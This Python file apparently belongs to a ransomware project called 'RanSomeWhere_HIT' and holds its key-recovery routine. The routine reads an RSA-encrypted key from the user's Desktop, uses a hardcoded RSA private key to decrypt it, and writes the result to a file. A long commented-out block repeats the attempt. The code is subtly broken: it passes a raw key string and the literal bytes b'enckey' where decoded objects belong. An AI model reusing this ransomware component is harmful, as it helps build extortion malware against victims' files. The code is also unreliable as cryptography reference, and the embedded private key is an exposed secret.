import binascii
import os
from warnings import catch_warnings
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64decode

def dy_pass():
    
    x=open(os.environ['HOME'] +'/Desktop/RanSomeWhere_HIT/pass','rb')
    hexval=x.read()
    #convert the key from hex to bytes
    enckey=binascii.unhexlify(hexval)
    #import the private key
    server_key = """MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAwfeo603JJPMyn9o+JyC97XcsJENaFTQl9SHBiUmu5y6H1p07d11MqajrOWbjjRggbdPZNWNOn3Fmg8zop6HMvwIDAQABAkAQO9cSYn88LXKGOHDNO4tJzZiPLGfksGmg24NkJxuRU4lS7lyVLcJcSlzVPHVjo501sYcF2xs02XTxnl9prNlpAiEA4kiNkHJPR8pHTTX9ouc09FQtqCm6CtDbnh96CwJqYWUCIQDbcKwLX61hm+fLrZD9D7HAvRAPANO78da21uP4SxRFUwIgCZsG12Di2KtPh4mJMMcbyltgbMkIqrje+cFgTuNVXLkCIFhqj4eNp2hazwyMBI1SU4abJutEpAtoJ+FHuFcEuUgtAiEAld4Pnan931EYnzcyKtLuga3XDzmKdi2SeLB8wK/NGdY="""

    decryptorRSA = PKCS1_OAEP.new(server_key)
    # decrypt the key and write the result as hex in a file named key
    deckey=decryptorRSA.decrypt(b'enckey')
    print(deckey)
    f=open(os.environ['HOME'] + '/Desktop/RanSomeWhere_HIT/key','wb')
    f.write(binascii.hexlify(deckey))
    return deckey

    
    # if not os.path.isfile(os.environ['HOME'] + '/Desktop/RanSomeWhere_HIT/deckey'):
    #     x = open(os.environ['HOME'] + '/Desktop/RanSomeWhere_HIT/deckey', 'wb')
    #     x.close()
    # x = open(os.environ['HOME'] + '/Desktop/RanSomeWhere_HIT/pass', 'rb')
    # deckey=x.read()
    # if deckey == b'':
    #     return None
    # enckey = binascii.unhexlify(deckey)
    # x.close()
    # try:
    #     privateKeyFile=open('private_key_str.pem', 'rb').read()
    #     print(privateKeyFile)
    # except OSError:
    #         print("You don't have the private key in the same directory")
    # rsa_key = RSA.importKey(privateKeyFile)
    # cipher = PKCS1_OAEP.new(b"rsa_key")
    # print(enckey)
    # raw_cipher_data = b64decode(enckey)
    # print(raw_cipher_data)
    # phn = cipher.decrypt(raw_cipher_data)
    # print(phn)

    # length=512
    # default_length = 512
    # if length < default_length:
    #     decrypt_byte = cipher.decrypt(encrypt_byte, 'failure')
    # else:
    #     offset = 0
    #     res = []
    #     while length - offset > 0:
    #         if length - offset > default_length:
    #             res.append(cipher.decrypt(encrypt_byte[offset: offset + 
    #                 default_length], 'failure'))
    #         else:
    #             res.append(cipher.decrypt(encrypt_byte[offset:], 'failure'))
    #         offset += default_length
    #     decrypt_byte = b''.join(res)
    # decrypted = decrypt_byte.decode()
    # return phn